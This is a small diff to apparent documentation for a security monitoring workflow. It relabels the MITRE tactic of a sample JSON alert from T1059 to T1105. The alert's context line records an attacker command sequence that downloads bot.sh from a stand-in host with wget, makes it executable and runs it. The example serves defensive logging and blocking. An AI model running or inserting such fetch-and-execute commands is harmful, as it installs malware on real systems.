@@ -250,7 +250,7 @@ Extend the workflow by adding nodes for:
   "commands": "wget http://malicious.com/bot.sh, chmod +x bot.sh, ./bot.sh",
   "abuse_score": "95%",
   "severity": 85,
-  "mitre_tactic": "T1059 - Command and Scripting Interpreter",
+  "mitre_tactic": "T1105 - Ingress Tool Transfer",
   "action_taken": "IP blocked via iptables"
 }
 ```
